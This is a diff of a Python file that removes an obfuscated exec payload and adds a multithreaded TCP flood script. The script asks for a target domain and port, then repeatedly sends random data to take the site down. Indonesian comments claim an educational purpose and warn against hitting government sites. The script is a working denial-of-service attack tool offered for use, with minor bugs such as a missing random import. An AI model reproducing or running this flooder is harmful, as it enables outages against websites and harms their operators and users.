@@ -1,2 +1,74 @@
-import marshal, zlib, base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("eJyVVW1v2zYQ7seFv+IsF7C0pUI6AwNSwB3c2C28LKkRawiGLAhoiZFYS6RKUkmNot/7cQOSDRjQP5dfsqPenNQqhsiGSB7vnntOvDvq9989edLvw6j7gTPowznMpyez4zfjYHwMvd63dAnC/EJFTAVMOLwpBF3h9DdhihVMJnIBp2ypuWGwYDlThsNLcPxY+jxy4BlOdZiUcyu8cgD6/RKRrygEUqYaZoLfR16wbElV5fCQZhwCHtEVvGIqQGFciBjpXNMljA3VcMhSmlJe6qZ2CJhKaERzmDOxxq0ELaiVN756Peu/Xh7PYDJDEHQpYusd3ZjiXdFGOI2KFdV8F8YxVTBHYqgScyEYrtYmkfhVaE4NHDFBESWBUySnyziUofA74sKvlCOXWnG2KgxipPQdVX5JhSmeUesl8X3Cs1wqA1I3M71up4ZnrBXLcMVMu5MoRiMuYkL6ikUwgsEfe8Ph2f7zbED6sWJMbGQ/WpmQIpSpVK14z0qXacFayXCIIhKxSwhTRpXrvSA7UvtIyLDMHYSpHgC/RKo+hs5Go4EwA2CpZjAoDQYeIbUl6WdM0YTkigvjOo7TsCPk7u/P3f/bf6B6Rs8e/jB7g4M5vH57AqfTV4tZMMVc/lqJ3N3+e3f7p/3XcDf18vZLN+aEXbFUYg7XyTFh15R2IZekGtS/cP4ISU3qSyuBatYdP9ni3kRA7mNbiK01eurG3LD4CnLD5xunsUVni+gDi5sHRG8eOOsm3HwafDBHMGse/ZBEaoMZrI1yucgLTLaq1x1RXaxshU9khuVo6xFeYqvyPFJW0AhsZnabzFHBGtT6tgx1l8GBxL4QGi6FBne4t+e1FmV5dtoETeVai+c/tSY8t1GURe7HzNiwlmtbZ66demhrRysAIwG1QymusOU0JdZUsGNVl1wVm1J8/EctmwA1hoarsgtEFFvbCLBLRzLzL4pq4u7v73tkh292wkTykLkY6/fnzq5z1ivf/fL987kNc+c64SmDQBUMcXeMWtthR2+Crwa3Xo1fX8yOp8Fus7t4e3B4sQhOpuMjG+iEa47XyYLiaWFHttdFdamg9sLgl87wnlDYquGQG6tiGy/H0ciI2a5SOvfD6iBdl+e7NjssUSvXTESuDb5cX2L3/IAnaqONmVumhVfS31L9f0F1bBx+cBZMGGMP9SPPPwFeMGV+frTvT71ez7Hq7EPIcvOiZptKzdx7KJhaTzG1OuwhkteixCDE0l/fo1/lKAZgy88keALtreJXWeoaqjAXcafKBa9W9TVuGNf7D9Ng2Ug="))))
+## ======================= [ # ] PERINGATAN !! =======================
+## Jangan Di Gunakan Untuk DDoS Website Seperti > ".go.id" - ".sch.id" ".gov"  ##
+## Jika Tools Ini Di Gunakan Sembarangan Kami Tidak BerTanggung Jawab Atas Kelalaian Kalian Terhadap Penyalahgunaan Tools Ini!!
+## Tools INI DI Kembangkan Bertujuan Untuk Edukasi, Agar Para Beginner Python Dapat Menambah Wawasan Serta Yang Lainya Dapat Ikut Belajar.
+## Terimakasih..
+import os
+import sys
+import time
+import socket
+import threading
+
+#red = '\033[91m'
+#green = '\033[92m'
+#noncolor = '\033[0m'
+#blue = '\033[33m'
+
+def clear():
+	os.system('cls' if os.name=='nt' else 'clear')
+
+clear()
+#merah
+print("""\033[91m
+
+████████╗       =-=-=-=-=-=-=-=- [ TCP FOR WEBSITE ] =-=-=-=-=-=-=-=-
+╚══██╔══╝   =-=-=-=-=-=-=-=- [ Developer Tools Dewaa ] =-=-=-=-=-=-=-=-
+     ██║   
+     ██║   
+     ██║   
+     ╚═╝   
+         
+  ██████╗ 
+██╔════╝ 
+██║      
+██║      
+╚██████╗ 
+  ╚═════╝ 
+         
+██████╗  
+██╔══██╗ 
+██████╔╝ 
+██╔═══╝  
+██║      
+╚═╝      """)
+##################################################
+host = str(input("[ # ] Masukkan Domainnya  >> "))
+port = int(input("[ # ] Masukkan Portnya >> "))
+times = int(input("[ # ] Connections (300) >> "))
+threads = int(input("[ # ] Threading (3016) >> "))
+ip = socket.gethostbyname(host) # hostname to ip convert
+print("\033[33m") # biru
+clear()
+##################################################
+
+def attack():
+	data = random._urandom(999)
+	i = random.choice(("[*]","[!]","[#]","[?]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Disini Saya Menggunakan SockStream Karena Kita Memakai Metode TCP
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+				s.send(data)
+				s.send(data)
+			print(i +"Sentt to {ip} on port {port}!!!")
+		except:
+			s.close()
+			print("[ $ ] {ip} on port {port} down!!")
+
+
+for y in range(threads):
+    th = threading.Thread(target = attack)
+    th.start()
